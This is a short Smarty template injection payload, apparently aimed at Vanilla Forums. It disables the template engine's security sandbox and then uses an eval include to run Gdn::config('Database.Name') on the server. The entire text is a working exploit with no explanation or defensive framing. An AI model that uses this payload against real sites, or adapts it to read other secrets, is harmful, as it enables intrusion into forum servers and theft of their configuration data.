{$name=$smarty.template_object->disableSecurity()}
{$template="Gdn::config('Database.Name')"}
{include file="eval:{$smarty.ldelim}{$template}{$smarty.rdelim}"}
